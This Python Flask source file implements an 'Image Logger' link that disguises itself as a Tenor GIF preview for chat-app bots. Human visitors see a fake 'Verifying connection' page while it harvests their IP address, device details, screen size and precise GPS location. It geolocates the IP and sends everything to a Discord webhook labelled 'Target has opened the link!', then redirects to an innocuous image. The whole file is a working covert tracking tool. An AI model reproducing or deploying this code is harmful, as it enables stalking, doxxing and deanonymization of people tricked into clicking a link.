from flask import Flask, request, redirect
import requests
import json
import os
from datetime import datetime
from user_agents import parse

app = Flask(__name__)

# CONFIGURATION (Loaded from Environment Variables in Vercel)
WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
CUSTOM_IMAGE_URL = os.environ.get("CUSTOM_IMAGE_URL", "") 

# List of random fallback images
IMAGES = [
    "https://images.unsplash.com/photo-1506744038136-46273834b3fb",
    "https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05",
    "https://images.unsplash.com/photo-1441974231531-c6227db76b6e",
    "https://images.unsplash.com/photo-1501785888041-af3ef285b470",
    "https://images.unsplash.com/photo-1493246507139-91e8bef99c02"
]

def get_ip_info(ip):
    try:
        fields = "status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,proxy,mobile,currency"
        response = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}")
        return response.json()
    except Exception:
        return {}

def send_to_discord(ip, ua_string, geo, gps_data=None):
    try:
        ua = parse(ua_string)
        os_detail = f"{ua.os.family} {ua.os.version_string}"
        browser_detail = f"{ua.browser.family} {ua.browser.version_string}"
        full_device = f"{ua.os.family} | {ua.browser.family} | {ua.device.family}"

        # FIXED Logic: Only use GPS label if coordinates are actually provided
        has_gps = gps_data and gps_data.get('lat') is not None and gps_data.get('lon') is not None
        
        coords = f"{geo.get('lat', '??')}, {geo.get('lon', '??')} (Approximate)"
        location_source = "🌐 IP Hub"
        
        if has_gps:
            coords = f"{gps_data.get('lat')}, {gps_data.get('lon')} (📍 Pinpoint GPS)"
            location_source = "📍 GPS Accurate"

        embed = {
            "title": "Image Logger - IP Logged",
            "description": f"Target has opened the link! Source: **{location_source}**",
            "color": 3447003,
            "thumbnail": {"url": "https://i.imgur.com/w9fXfM9.png"},
            "fields": [
                {"name": "Endpoint", "value": "`/api/image`", "inline": False},
                {"name": "IP Info:", "value": f"```\nIP: {ip}\nProvider: {geo.get('isp', 'Unknown')}\nASN: {geo.get('as', 'Unknown')}\nCountry: {geo.get('country', 'Unknown')}\nRegion: {geo.get('regionName', 'Unknown')}\nCity: {geo.get('city', 'Unknown')}\nCoords: {coords}\nTimezone: {geo.get('timezone', 'Unknown')}\nMobile: {'True' if geo.get('mobile') else 'False'}\nVPN: {'True' if geo.get('proxy') else 'False'}\nBot: False\n```", "inline": False},
                {"name": "PC Info:", "value": f"```\nOS: {os_detail}\nBrowser: {browser_detail}\nDetails: {full_device}\nResolution: {gps_data.get('res', 'Unknown') if gps_data else 'Unknown'}\n```", "inline": False}
            ],
            "timestamp": datetime.now().isoformat()
        }
        requests.post(WEBHOOK_URL, json={"username": "Image Logger", "embeds": [embed]}, timeout=10)
    except:
        pass

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def index(path):
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    # 1. Discord Bot Detection & LARGE PREVIEW Enhancement
    if any(bot in user_agent for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "LinkedInBot"]):
        return """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading Tenor GIF...</title>
            <meta property="og:title" content="Tenor - Animated GIF">
            <meta property="og:description" content="Click to view high-quality media...">
            <!-- Transparent/Dark Loading GIF for 'Whole Box' look -->
            <meta property="og:image" content="https://media.tenor.com/C7_89Jp5X6AAAAAC/loading-black.gif">
            <meta property="og:image:type" content="image/gif">
            <meta property="og:image:width" content="1200">
            <meta property="og:image:height" content="630">
            <meta property="og:type" content="website">
            <meta name="twitter:card" content="summary_large_image">
            <meta name="twitter:image" content="https://media.tenor.com/C7_89Jp5X6AAAAAC/loading-black.gif">
        </head>
        <body style="background-color: #2f3136;"></body>
        </html>
        """

    import random
    redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)

    # 2. Human Case: Serve JS Bridge for Logging
    return f"""
    <html>
    <head>
        <title>Verifying Connection...</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {{ background-color: #2f3136; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; margin: 0; }}
            .loader {{ border: 4px solid #444; border-top: 4px solid #5865f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .container {{ text-align: center; padding: 20px; }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="loader" style="margin: 0 auto 20px;"></div>
            <h2>Verifying connection...</h2>
            <p>Please wait while we secure your media stream.</p>
        </div>

        <script>
            const webhook_data = {{
                ip: "{ip}",
                ua: navigator.userAgent,
                res: window.screen.width + 'x' + window.screen.height
            }};

            function finalize(gps = null) {{
                fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ ...webhook_data, gps: gps }})
                }}).finally(() => {{
                    window.location.href = "{redirect_url}";
                }});
            }}

            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (pos) => {{ finalize({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}); }},
                    (err) => {{ finalize(); }},
                    {{ enableHighAccuracy: true, timeout: 5000 }}
                );
            }} else {{
                finalize();
            }}
            
            setTimeout(() => {{ window.location.href = "{redirect_url}"; }}, 10000);
        </script>
    </body>
    </html>
    """

@app.route('/log', methods=['POST'])
def log_endpoint():
    try:
        data = request.json
        ip = data.get('ip')
        ua = data.get('ua')
        gps = data.get('gps') 
        
        geo = get_ip_info(ip)
        
        # FIXED: Only pass lat/lon if they actually exist
        gps_payload = None
        if gps and gps.get('lat') is not None:
            gps_payload = { 'lat': gps['lat'], 'lon': gps['lon'], 'res': data.get('res') }
        else:
            gps_payload = { 'res': data.get('res') }
            
        send_to_discord(ip, ua, geo, gps_data=gps_payload)
        
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "message": str(e)}, 500

if __name__ == '__main__':
    app.run(debug=True)
